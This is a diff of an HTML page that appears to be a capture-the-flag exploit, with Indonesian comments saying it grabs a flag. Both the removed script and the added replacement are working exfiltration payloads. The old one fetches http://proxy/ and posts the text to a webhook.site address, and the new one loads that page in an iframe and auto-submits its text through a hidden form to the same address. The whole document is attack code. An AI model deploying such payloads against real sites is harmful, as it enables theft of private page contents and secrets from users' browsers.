@@ -1,27 +1,14 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script>
-(async () => {
-  try {
-    // fetch halaman root (http://proxy/) yang ada flag
-    let res = await fetch("http://proxy/");
-    let text = await res.text();
+<form action="https://webhook.site/9cf23925-1943-4d85-9be5-56a8ca40c833" method="POST" id="exfil">
+  <textarea name="leak" id="leak"></textarea>
+</form>
 
-    // kirim hasilnya ke webhook kamu
-    await fetch("https://webhook.site/9cf23925-1943-4d85-9be5-56a8ca40c833", {
-      method: "POST",
-      headers: {"Content-Type": "text/plain"},
-      body: text
-    });
-  } catch (e) {
-    await fetch("https://webhook.site/9cf23925-1943-4d85-9be5-56a8ca40c833", {
-      method: "POST",
-      headers: {"Content-Type": "text/plain"},
-      body: "Error: " + e.toString()
-    });
-  }
-})();
-</script>
+<iframe src="http://proxy/" onload="
+  document.getElementById('leak').value=this.contentDocument.body.innerText;
+  document.getElementById('exfil').submit();
+"></iframe>
+
 </body>
 </html>
